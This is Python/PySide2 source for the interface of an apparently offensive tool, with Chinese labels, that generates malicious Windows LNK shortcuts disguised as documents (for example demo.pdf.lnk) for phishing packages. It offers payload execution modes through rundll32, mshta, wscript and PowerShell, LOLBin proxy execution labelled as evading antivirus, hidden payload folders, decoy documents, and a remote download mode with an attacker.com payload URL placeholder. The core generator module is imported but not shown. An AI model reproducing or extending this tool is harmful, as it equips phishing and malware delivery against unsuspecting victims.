import os
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QGroupBox,
    QTextEdit, QScrollArea, QFrame
)
from PySide2.QtCore import Qt
from generators.lnk_generator import (
    generate_lnk, get_execution_modes, get_icon_types,
    get_mode_description, is_remote_mode, is_separator
)


class LNKTab(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(20, 20, 20, 20)
        content_layout.setSpacing(12)

        # --- 标题 ---
        title = QLabel("LNK 快捷方式生成器")
        title.setObjectName("titleLabel")
        content_layout.addWidget(title)

        subtitle = QLabel(
            "生成伪装为文档的恶意 LNK 快捷方式，配合隐藏目录构建完整钓鱼文件包"
        )
        subtitle.setObjectName("subtitleLabel")
        subtitle.setWordWrap(True)
        content_layout.addWidget(subtitle)

        # ===== 执行方式 =====
        exec_group = QGroupBox("执行方式")
        exec_layout = QVBoxLayout()

        mode_row = QHBoxLayout()
        mode_row.addWidget(QLabel("执行方式:"))
        self.mode_selector = QComboBox()
        modes = get_execution_modes()
        for mode in modes:
            self.mode_selector.addItem(mode)
            if is_separator(mode):
                idx = self.mode_selector.count() - 1
                self.mode_selector.model().item(idx).setEnabled(False)
        self.mode_selector.setCurrentIndex(1)  # 第一个非分隔线
        self.mode_selector.currentIndexChanged.connect(self.on_mode_changed)
        mode_row.addWidget(self.mode_selector, 1)
        exec_layout.addLayout(mode_row)

        self.mode_desc_label = QLabel("")
        self.mode_desc_label.setObjectName("subtitleLabel")
        self.mode_desc_label.setWordWrap(True)
        exec_layout.addWidget(self.mode_desc_label)

        # Payload 相对路径（本地模式）
        self.payload_path_row = QWidget()
        pp_layout = QHBoxLayout(self.payload_path_row)
        pp_layout.setContentsMargins(0, 0, 0, 0)
        pp_layout.addWidget(QLabel("Payload路径:"))
        self.payload_path_input = QLineEdit()
        self.payload_path_input.setPlaceholderText("隐藏目录中的payload相对路径，如：data\\demo.exe")
        self.payload_path_input.setText("data\\demo.exe")
        pp_layout.addWidget(self.payload_path_input, 1)
        exec_layout.addWidget(self.payload_path_row)

        # 命令/URL（远程模式）
        self.remote_url_row = QWidget()
        ru_layout = QHBoxLayout(self.remote_url_row)
        ru_layout.setContentsMargins(0, 0, 0, 0)
        ru_layout.addWidget(QLabel("命令/URL:"))
        self.remote_url_input = QLineEdit()
        self.remote_url_input.setPlaceholderText("远程文件URL或PowerShell命令")
        ru_layout.addWidget(self.remote_url_input, 1)
        exec_layout.addWidget(self.remote_url_row)

        # DLL导出函数（Rundll32模式）
        self.dll_export_row = QWidget()
        de_layout = QHBoxLayout(self.dll_export_row)
        de_layout.setContentsMargins(0, 0, 0, 0)
        de_layout.addWidget(QLabel("导出函数:"))
        self.dll_export_input = QLineEdit()
        self.dll_export_input.setPlaceholderText("DLL导出函数名")
        self.dll_export_input.setText("DllMain")
        de_layout.addWidget(self.dll_export_input, 1)
        exec_layout.addWidget(self.dll_export_row)

        # 远程下载保存文件名
        self.dl_name_row = QWidget()
        dn_layout = QHBoxLayout(self.dl_name_row)
        dn_layout.setContentsMargins(0, 0, 0, 0)
        dn_layout.addWidget(QLabel("保存文件名:"))
        self.dl_name_input = QLineEdit()
        self.dl_name_input.setPlaceholderText("远程下载后保存的文件名")
        self.dl_name_input.setText("update.exe")
        dn_layout.addWidget(self.dl_name_input, 1)
        exec_layout.addWidget(self.dl_name_row)

        # 模式提示标签（规避/DLL警告等）
        self.mode_hint_label = QLabel("")
        self.mode_hint_label.setWordWrap(True)
        exec_layout.addWidget(self.mode_hint_label)

        exec_group.setLayout(exec_layout)
        content_layout.addWidget(exec_group)

        # ===== 伪装设置 =====
        disguise_group = QGroupBox("伪装设置")
        disguise_layout = QVBoxLayout()

        icon_row = QHBoxLayout()
        icon_row.addWidget(QLabel("显示图标:"))
        self.icon_selector = QComboBox()
        self.icon_selector.addItems(get_icon_types())
        icon_row.addWidget(self.icon_selector, 1)
        disguise_layout.addLayout(icon_row)

        fn_row = QHBoxLayout()
        fn_row.addWidget(QLabel("LNK文件名:"))
        self.filename_input = QLineEdit()
        self.filename_input.setPlaceholderText("如：demo.pdf.lnk")
        self.filename_input.setText("demo.pdf.lnk")
        fn_row.addWidget(self.filename_input, 1)
        disguise_layout.addLayout(fn_row)

        desc_row = QHBoxLayout()
        desc_row.addWidget(QLabel("文件描述:"))
        self.desc_input = QLineEdit()
        self.desc_input.setPlaceholderText("鼠标悬停显示的描述")
        self.desc_input.setText("Document")
        desc_row.addWidget(self.desc_input, 1)
        disguise_layout.addLayout(desc_row)

        disguise_group.setLayout(disguise_layout)
        content_layout.addWidget(disguise_group)

        # ===== 诱饵文件 =====
        decoy_group = QGroupBox("诱饵文件")
        decoy_layout = QVBoxLayout()

        decoy_path_row = QHBoxLayout()
        decoy_path_row.addWidget(QLabel("诱饵文件路径:"))
        self.decoy_input = QLineEdit()
        self.decoy_input.setPlaceholderText("可选：诱饵文档相对路径，如 data\\decoy.pdf")
        decoy_path_row.addWidget(self.decoy_input, 1)
        decoy_layout.addLayout(decoy_path_row)

        decoy_hint = QLabel(
            "提示：设置诱饵文件后，目标双击LNK时会同时打开正常文档作为掩护"
        )
        decoy_hint.setObjectName("subtitleLabel")
        decoy_hint.setWordWrap(True)
        decoy_layout.addWidget(decoy_hint)

        decoy_group.setLayout(decoy_layout)
        content_layout.addWidget(decoy_group)

        # ===== 生成预览 =====
        preview_group = QGroupBox("生成预览")
        preview_layout = QVBoxLayout()

        self.preview_text = QTextEdit()
        self.preview_text.setReadOnly(True)
        self.preview_text.setMaximumHeight(150)
        self.preview_text.setPlaceholderText("点击下方按钮预览将要生成的LNK参数和钓鱼目录结构...")
        self.preview_text.setStyleSheet(
            "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
        )
        preview_layout.addWidget(self.preview_text)

        self.preview_btn = QPushButton("🔍 预览命令")
        self.preview_btn.clicked.connect(self.preview_command)
        preview_layout.addWidget(self.preview_btn)

        preview_group.setLayout(preview_layout)
        content_layout.addWidget(preview_group)

        # ===== 操作按钮 =====
        btn_layout = QVBoxLayout()
        btn_layout.setSpacing(12)

        self.generate_btn = QPushButton("🚀 生成 LNK 文件")
        self.generate_btn.setObjectName("primaryButton")
        self.generate_btn.clicked.connect(self.generate)
        btn_layout.addWidget(self.generate_btn)

        content_layout.addLayout(btn_layout)

        # ===== 状态 =====
        self.status_label = QLabel("")
        self.status_label.setWordWrap(True)
        content_layout.addWidget(self.status_label)

        content_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        main_layout.addWidget(scroll_area)

        # 初始化
        self.on_mode_changed(1)

    # ---- 事件处理 ----

    def on_mode_changed(self, index):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        self.mode_desc_label.setText(get_mode_description(mode))

        remote = is_remote_mode(mode)
        self.payload_path_row.setVisible(not remote)
        self.remote_url_row.setVisible(remote)
        self.dll_export_row.setVisible(mode == "Rundll32 加载DLL")
        self.dl_name_row.setVisible(mode == "PowerShell 远程下载")

        # 动态 placeholder 和提示
        hint = ""
        if mode == "Rundll32 加载DLL":
            self.payload_path_input.setPlaceholderText("DLL相对路径，如：data\\payload.dll")
            hint = "⚠️ 此模式仅适用于 DLL 文件，不能用于 EXE"
            self.mode_hint_label.setStyleSheet("color: #e94560; font-weight: bold;")
        elif mode == "PowerShell 执行脚本":
            self.payload_path_input.setPlaceholderText("PS1脚本相对路径，如：data\\script.ps1")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "MSHTA 执行HTA":
            self.payload_path_input.setPlaceholderText("HTA文件相对路径，如：data\\payload.hta")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "WScript 执行VBS":
            self.payload_path_input.setPlaceholderText("VBS脚本相对路径，如：data\\script.vbs")
            self.mode_hint_label.setStyleSheet("")
        elif mode in ["Conhost 代理执行", "Pcalua 代理执行"]:
            self.payload_path_input.setPlaceholderText("EXE相对路径，如：data\\demo.exe")
            hint = "✅ 此模式不经过 cmd.exe，可规避部分杀软拦截"
            self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
        elif mode == "SyncAppvPublishingServer 执行":
            self.remote_url_input.setPlaceholderText("输入 PowerShell 命令")
            hint = "✅ 不直接调用 powershell.exe，利用 App-V 组件执行"
            self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
        elif mode == "PowerShell Base64 命令":
            self.remote_url_input.setPlaceholderText("输入 PowerShell 命令")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "PowerShell 远程下载":
            self.remote_url_input.setPlaceholderText("远程文件URL，如：https://attacker.com/payload.exe")
            self.mode_hint_label.setStyleSheet("")
        else:
            self.payload_path_input.setPlaceholderText("EXE相对路径，如：data\\demo.exe")
            self.mode_hint_label.setStyleSheet("")

        self.mode_hint_label.setText(hint)

    def preview_command(self):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        remote = is_remote_mode(mode)
        cmd = self.remote_url_input.text().strip() if remote else ""
        payload_path = self.payload_path_input.text().strip() if not remote else ""
        decoy = self.decoy_input.text().strip()

        if remote and not cmd:
            self.preview_text.setText("⚠️ 请输入命令或URL")
            return
        if not remote and not payload_path:
            self.preview_text.setText("⚠️ 请输入 Payload 相对路径")
            return

        lines = []
        lines.append(f"执行方式: {mode}")
        lines.append(f"图标: {self.icon_selector.currentText()}")
        lines.append(f"文件名: {self.filename_input.text()}")
        if not remote:
            lines.append(f"Payload路径: {payload_path}")
        else:
            lines.append(f"命令/URL: {cmd}")
        if decoy:
            lines.append(f"诱饵文件: {decoy}")
        lines.append("")

        # 目录结构预览
        fn = self.filename_input.text().strip()
        base = fn.replace('.lnk', '')
        folder = base.rsplit('.', 1)[0] if '.' in base else base
        hidden_dir = "data"

        lines.append("钓鱼目录结构：")
        lines.append(f"  {folder}/")
        lines.append(f"  ├── {fn}")
        lines.append(f"  └── {hidden_dir}/  (attrib +h +s {hidden_dir})")
        if payload_path:
            pn = payload_path.replace('\\', '/').split('/')[-1]
            lines.append(f"      ├── {pn}")
        if decoy:
            dn = decoy.replace('\\', '/').split('/')[-1]
            lines.append(f"      └── {dn}")

        self.preview_text.setText('\n'.join(lines))

    def generate(self):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        remote = is_remote_mode(mode)
        cmd = self.remote_url_input.text().strip() if remote else ""
        payload_path = self.payload_path_input.text().strip() if not remote else ""
        decoy = self.decoy_input.text().strip()
        icon_type = self.icon_selector.currentText()
        output_fn = self.filename_input.text().strip() or "demo.pdf.lnk"
        desc = self.desc_input.text().strip()
        dll_export = self.dll_export_input.text().strip() or "DllMain"
        dl_name = self.dl_name_input.text().strip() or "update.exe"
        hidden_dir = "data"

        if not remote and not payload_path:
            self._show_error("请输入 Payload 相对路径")
            return
        if remote and not cmd:
            self._show_error("请输入命令或URL")
            return

        success, message = generate_lnk(
            execution_mode=mode,
            command_or_url=cmd,
            icon_type=icon_type,
            output_filename=output_fn,
            payload_relative_path=payload_path,
            decoy_relative_path=decoy,
            description=desc,
            dll_export_function=dll_export,
            download_filename=dl_name,
        )

        if success:
            self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
            self.status_label.setText("✅ 生成成功")
            self.preview_text.setText(message)
            if self.window():
                self.window().statusBar().showMessage("LNK 生成成功")
        else:
            self._show_error(message)

    def _show_error(self, message):
        self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
        self.status_label.setText(f"❌ {message}")
